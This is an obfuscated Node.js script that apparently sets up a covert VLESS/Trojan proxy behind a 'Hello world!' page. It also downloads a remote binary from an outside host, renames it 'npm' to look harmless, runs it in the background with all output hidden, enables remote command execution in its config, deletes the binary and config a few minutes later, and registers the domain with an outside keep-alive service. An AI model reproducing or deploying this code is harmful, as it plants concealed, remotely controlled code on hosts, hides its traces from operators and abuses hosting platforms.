const _0x29fe=['sub','&type=A','stream','pop','error','catch','arm64','text/plain','--tls','createHash','https://arm64.ssss.nyc.mn/agent','\x20-p\x20','axios','2053','8443','includes','concat','PORT','Server','isp','close','http','Hello\x20world!','https://dns.google/resolve?name=','replace','application/dns-json','npm\x20is\x20already\x20running,\x20skip\x20running...','index.html','unlink','Answer','UUID','hex','slice','NEZHA_PORT','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running',':443?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/agent','readUInt16BE','config.yaml','NAME','join','write','1234.abc.com','writeHead','\x20with\x20all\x20DNS\x20servers','type','map','country_code','chmod\x20+x\x20npm','connect','NEZHA_KEY','toString','&fp=chrome&type=ws&host=','log','2083','readUInt8','npm\x20is\x20running','connection','end','buffer','data','8.8.4.4','arm','child_process','env','once','get','2087','pipe','net','length','320c34c2-333b-48ee-ae0b-7954fae5ce62','https://amd64.ssss.nyc.mn/v1','reduce','WSPATH','Server\x20is\x20running\x20on\x20port\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/v1','substr','false','digest','Failed\x20to\x20resolve\x20','send','vless://','Not\x20Found\x0a','path'];const _0x39aa=function(_0x29fe6b,_0x39aa4e){_0x29fe6b=_0x29fe6b-0x0;let _0x10b2fc=_0x29fe[_0x29fe6b];return _0x10b2fc;};const os=require('os');const http=require(_0x39aa('0x15'));const fs=require('fs');const axios=require(_0x39aa('0xc'));const net=require(_0x39aa('0x45'));const path=require(_0x39aa('0x55'));const crypto=require('crypto');const {Buffer}=require(_0x39aa('0x3b'));const {exec,execSync}=require(_0x39aa('0x3f'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process['env'][_0x39aa('0x1e')]||_0x39aa('0x47');const NEZHA_SERVER=process[_0x39aa('0x40')]['NEZHA_SERVER']||'';const NEZHA_PORT=process[_0x39aa('0x40')][_0x39aa('0x21')]||'';const NEZHA_KEY=process['env'][_0x39aa('0x32')]||'';const DOMAIN=process[_0x39aa('0x40')]['DOMAIN']||_0x39aa('0x2a');const AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![];const WSPATH=process['env'][_0x39aa('0x4a')]||UUID[_0x39aa('0x20')](0x0,0x8);const SUB_PATH=process[_0x39aa('0x40')]['SUB_PATH']||_0x39aa('0x0');const NAME=process['env'][_0x39aa('0x27')]||'';const PORT=process['env'][_0x39aa('0x11')]||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x20d556=await axios[_0x39aa('0x42')]('https://api.ip.sb/geoip');const _0x533ecd=_0x20d556[_0x39aa('0x3c')];ISP=(_0x533ecd[_0x39aa('0x2f')]+'-'+_0x533ecd[_0x39aa('0x13')])[_0x39aa('0x18')](/ /g,'_');}catch(_0xd440c1){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x3ca39a,_0x15dd95)=>{if(_0x3ca39a['url']==='/'){const _0x4dc244=path[_0x39aa('0x28')](__dirname,_0x39aa('0x1b'));fs['readFile'](_0x4dc244,'utf8',(_0x5242b6,_0x243570)=>{if(_0x5242b6){_0x15dd95[_0x39aa('0x2b')](0xc8,{'Content-Type':'text/html'});_0x15dd95[_0x39aa('0x3a')](_0x39aa('0x16'));return;}_0x15dd95[_0x39aa('0x2b')](0xc8,{'Content-Type':'text/html'});_0x15dd95[_0x39aa('0x3a')](_0x243570);});return;}else if(_0x3ca39a['url']==='/'+SUB_PATH){const _0x3268a5=NAME?NAME+'-'+ISP:ISP;const _0x2418b8=_0x39aa('0x53')+UUID+'@'+DOMAIN+_0x39aa('0x23')+DOMAIN+_0x39aa('0x34')+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x3268a5;const _0x157bcf='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x39aa('0x34')+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x3268a5;const _0x7349b9=_0x2418b8+'\x0a'+_0x157bcf;const _0x1e45df=Buffer['from'](_0x7349b9)['toString']('base64');_0x15dd95['writeHead'](0xc8,{'Content-Type':_0x39aa('0x7')});_0x15dd95['end'](_0x1e45df+'\x0a');}else{_0x15dd95[_0x39aa('0x2b')](0x194,{'Content-Type':_0x39aa('0x7')});_0x15dd95['end'](_0x39aa('0x54'));}});const wss=new WebSocket[(_0x39aa('0x12'))]({'server':httpServer});const uuid=UUID[_0x39aa('0x18')](/-/g,'');const DNS_SERVERS=[_0x39aa('0x3d'),'1.1.1.1'];function resolveHost(_0x182350){return new Promise((_0x57dab3,_0x248a49)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x182350)){_0x57dab3(_0x182350);return;}let _0x49541c=0x0;function _0x2e85f1(){if(_0x49541c>=DNS_SERVERS[_0x39aa('0x46')]){_0x248a49(new Error(_0x39aa('0x51')+_0x182350+_0x39aa('0x2c')));return;}const _0x381bc7=DNS_SERVERS[_0x49541c];_0x49541c++;const _0x2f1384=_0x39aa('0x17')+encodeURIComponent(_0x182350)+_0x39aa('0x1');axios[_0x39aa('0x42')](_0x2f1384,{'timeout':0x1388,'headers':{'Accept':_0x39aa('0x19')}})['then'](_0x1d509e=>{const _0x5676c0=_0x1d509e[_0x39aa('0x3c')];if(_0x5676c0['Status']===0x0&&_0x5676c0[_0x39aa('0x1d')]&&_0x5676c0[_0x39aa('0x1d')][_0x39aa('0x46')]>0x0){const _0x57e2a7=_0x5676c0[_0x39aa('0x1d')]['find'](_0x185399=>_0x185399[_0x39aa('0x2d')]===0x1);if(_0x57e2a7){_0x57dab3(_0x57e2a7[_0x39aa('0x3c')]);return;}}_0x2e85f1();})['catch'](_0x4faed5=>{_0x2e85f1();});}_0x2e85f1();});}function handleVlessConnection(_0x3a1954,_0x1a2b28){const [_0x2fa6a0]=_0x1a2b28;const _0x1b67cf=_0x1a2b28['slice'](0x1,0x11);if(!_0x1b67cf['every']((_0x52c480,_0xbb0a48)=>_0x52c480==parseInt(uuid['substr'](_0xbb0a48*0x2,0x2),0x10)))return![];let _0xf83bcf=_0x1a2b28['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x549c82=_0x1a2b28['slice'](_0xf83bcf,_0xf83bcf+=0x2)['readUInt16BE'](0x0);const _0x10cea6=_0x1a2b28[_0x39aa('0x20')](_0xf83bcf,_0xf83bcf+=0x1)[_0x39aa('0x37')]();const _0x353d92=_0x10cea6==0x1?_0x1a2b28[_0x39aa('0x20')](_0xf83bcf,_0xf83bcf+=0x4)['join']('.'):_0x10cea6==0x2?new TextDecoder()['decode'](_0x1a2b28['slice'](_0xf83bcf+0x1,_0xf83bcf+=0x1+_0x1a2b28['slice'](_0xf83bcf,_0xf83bcf+0x1)['readUInt8']())):_0x10cea6==0x3?_0x1a2b28[_0x39aa('0x20')](_0xf83bcf,_0xf83bcf+=0x10)[_0x39aa('0x49')]((_0x370874,_0x2d8466,_0xf4cad5,_0x544f7f)=>_0xf4cad5%0x2?_0x370874['concat'](_0x544f7f['slice'](_0xf4cad5-0x1,_0xf4cad5+0x1)):_0x370874,[])[_0x39aa('0x2e')](_0x20468c=>_0x20468c[_0x39aa('0x25')](0x0)['toString'](0x10))[_0x39aa('0x28')](':'):'';_0x3a1954[_0x39aa('0x52')](new Uint8Array([_0x2fa6a0,0x0]));const _0x5ab4a9=createWebSocketStream(_0x3a1954);resolveHost(_0x353d92)['then'](_0x4bfc8a=>{net['connect']({'host':_0x4bfc8a,'port':_0x549c82},function(){this['write'](_0x1a2b28[_0x39aa('0x20')](_0xf83bcf));_0x5ab4a9['on']('error',()=>{})[_0x39aa('0x44')](this)['on'](_0x39aa('0x4'),()=>{})[_0x39aa('0x44')](_0x5ab4a9);})['on'](_0x39aa('0x4'),()=>{});})[_0x39aa('0x5')](_0x66aefe=>{net['connect']({'host':_0x353d92,'port':_0x549c82},function(){this[_0x39aa('0x29')](_0x1a2b28[_0x39aa('0x20')](_0xf83bcf));_0x5ab4a9['on'](_0x39aa('0x4'),()=>{})['pipe'](this)['on']('error',()=>{})[_0x39aa('0x44')](_0x5ab4a9);})['on']('error',()=>{});});return!![];}function handleTrojanConnection(_0x52970e,_0x3b030b){try{if(_0x3b030b['length']<0x3a)return![];const _0x2a4e49=_0x3b030b[_0x39aa('0x20')](0x0,0x38)[_0x39aa('0x33')]();const _0x194d34=[UUID];let _0x1339b6=null;for(const _0x4e9a35 of _0x194d34){const _0x45fbc8=crypto[_0x39aa('0x9')]('sha224')['update'](_0x4e9a35)[_0x39aa('0x50')](_0x39aa('0x1f'));if(_0x45fbc8===_0x2a4e49){_0x1339b6=_0x4e9a35;break;}}if(!_0x1339b6)return![];let _0x3d21a7=0x38;if(_0x3b030b[_0x3d21a7]===0xd&&_0x3b030b[_0x3d21a7+0x1]===0xa){_0x3d21a7+=0x2;}const _0x21cdcc=_0x3b030b[_0x3d21a7];if(_0x21cdcc!==0x1)return![];_0x3d21a7+=0x1;const _0xc34037=_0x3b030b[_0x3d21a7];_0x3d21a7+=0x1;let _0x2d6264,_0x1070fb;if(_0xc34037===0x1){_0x2d6264=_0x3b030b['slice'](_0x3d21a7,_0x3d21a7+0x4)[_0x39aa('0x28')]('.');_0x3d21a7+=0x4;}else if(_0xc34037===0x3){const _0x1a92e3=_0x3b030b[_0x3d21a7];_0x3d21a7+=0x1;_0x2d6264=_0x3b030b['slice'](_0x3d21a7,_0x3d21a7+_0x1a92e3)[_0x39aa('0x33')]();_0x3d21a7+=_0x1a92e3;}else if(_0xc34037===0x4){_0x2d6264=_0x3b030b[_0x39aa('0x20')](_0x3d21a7,_0x3d21a7+0x10)[_0x39aa('0x49')]((_0x365b58,_0x56ae82,_0x3a6502,_0x5ccce9)=>_0x3a6502%0x2?_0x365b58[_0x39aa('0x10')](_0x5ccce9[_0x39aa('0x20')](_0x3a6502-0x1,_0x3a6502+0x1)):_0x365b58,[])['map'](_0x2a1139=>_0x2a1139[_0x39aa('0x25')](0x0)['toString'](0x10))[_0x39aa('0x28')](':');_0x3d21a7+=0x10;}else{return![];}_0x1070fb=_0x3b030b['readUInt16BE'](_0x3d21a7);_0x3d21a7+=0x2;if(_0x3d21a7<_0x3b030b['length']&&_0x3b030b[_0x3d21a7]===0xd&&_0x3b030b[_0x3d21a7+0x1]===0xa){_0x3d21a7+=0x2;}const _0x1bd841=createWebSocketStream(_0x52970e);resolveHost(_0x2d6264)['then'](_0x13f185=>{net[_0x39aa('0x31')]({'host':_0x13f185,'port':_0x1070fb},function(){if(_0x3d21a7<_0x3b030b['length']){this[_0x39aa('0x29')](_0x3b030b[_0x39aa('0x20')](_0x3d21a7));}_0x1bd841['on'](_0x39aa('0x4'),()=>{})['pipe'](this)['on'](_0x39aa('0x4'),()=>{})['pipe'](_0x1bd841);})['on'](_0x39aa('0x4'),()=>{});})['catch'](_0x11340f=>{net[_0x39aa('0x31')]({'host':_0x2d6264,'port':_0x1070fb},function(){if(_0x3d21a7<_0x3b030b['length']){this[_0x39aa('0x29')](_0x3b030b['slice'](_0x3d21a7));}_0x1bd841['on']('error',()=>{})['pipe'](this)['on'](_0x39aa('0x4'),()=>{})[_0x39aa('0x44')](_0x1bd841);})['on'](_0x39aa('0x4'),()=>{});});return!![];}catch(_0x217374){return![];}}wss['on'](_0x39aa('0x39'),(_0x4cdd85,_0x1fcbdb)=>{const _0x1e3a7b=_0x1fcbdb['url']||'';_0x4cdd85[_0x39aa('0x41')]('message',_0x41471c=>{if(_0x41471c['length']>0x11&&_0x41471c[0x0]===0x0){const _0x111044=_0x41471c[_0x39aa('0x20')](0x1,0x11);const _0x68c5ce=_0x111044['every']((_0x3707bd,_0x2f7d4d)=>_0x3707bd==parseInt(uuid[_0x39aa('0x4e')](_0x2f7d4d*0x2,0x2),0x10));if(_0x68c5ce){if(!handleVlessConnection(_0x4cdd85,_0x41471c)){_0x4cdd85['close']();}return;}}if(!handleTrojanConnection(_0x4cdd85,_0x41471c)){_0x4cdd85[_0x39aa('0x14')]();}})['on'](_0x39aa('0x4'),()=>{});});const getDownloadUrl=()=>{const _0x2db7dd=os['arch']();if(_0x2db7dd===_0x39aa('0x3e')||_0x2db7dd===_0x39aa('0x6')||_0x2db7dd==='aarch64'){if(!NEZHA_PORT){return _0x39aa('0x4d');}else{return _0x39aa('0xa');}}else{if(!NEZHA_PORT){return _0x39aa('0x48');}else{return _0x39aa('0x24');}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x27244e=getDownloadUrl();const _0x5a25a6=await axios({'method':_0x39aa('0x42'),'url':_0x27244e,'responseType':_0x39aa('0x2')});const _0x465363=fs['createWriteStream']('npm');_0x5a25a6[_0x39aa('0x3c')][_0x39aa('0x44')](_0x465363);return new Promise((_0x5a4f41,_0x28c1bc)=>{_0x465363['on']('finish',()=>{console[_0x39aa('0x35')]('npm\x20download\x20successfully');exec(_0x39aa('0x30'),_0x98bc5e=>{if(_0x98bc5e)_0x28c1bc(_0x98bc5e);_0x5a4f41();});});_0x465363['on']('error',_0x28c1bc);});}catch(_0x53083b){throw _0x53083b;}};const runnz=async()=>{try{const _0xeff249=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0xeff249['trim']()!==''){console[_0x39aa('0x35')](_0x39aa('0x1a'));return;}}catch(_0x3b4da2){}await downloadFile();let _0x48c779='';let _0x24db0c=['443',_0x39aa('0xe'),'2096',_0x39aa('0x43'),_0x39aa('0x36'),_0x39aa('0xd')];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2a87a5=_0x24db0c['includes'](NEZHA_PORT)?_0x39aa('0x8'):'';_0x48c779='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x39aa('0xb')+NEZHA_KEY+'\x20'+_0x2a87a5+_0x39aa('0x4c');}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x44a0c8=NEZHA_SERVER[_0x39aa('0xf')](':')?NEZHA_SERVER['split'](':')[_0x39aa('0x3')]():'';const _0x12b811=_0x24db0c[_0x39aa('0xf')](_0x44a0c8)?'true':_0x39aa('0x4f');const _0x1c0433='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x12b811+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x39aa('0x26'),_0x1c0433);}_0x48c779='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x39aa('0x35')](_0x39aa('0x22'));return;}try{exec(_0x48c779,{'shell':'/bin/bash'},_0x25be0b=>{if(_0x25be0b)console[_0x39aa('0x4')]('npm\x20running\x20error:',_0x25be0b);else console[_0x39aa('0x35')](_0x39aa('0x38'));});}catch(_0x5cbf4a){console[_0x39aa('0x4')]('error:\x20'+_0x5cbf4a);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x31deb3='https://'+DOMAIN;try{const _0x17a5c4=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x31deb3},{'headers':{'Content-Type':'application/json'}});console[_0x39aa('0x35')]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xb76912){}}const delFiles=()=>{fs[_0x39aa('0x1c')]('npm',()=>{});fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console[_0x39aa('0x35')](_0x39aa('0x4b')+PORT);});
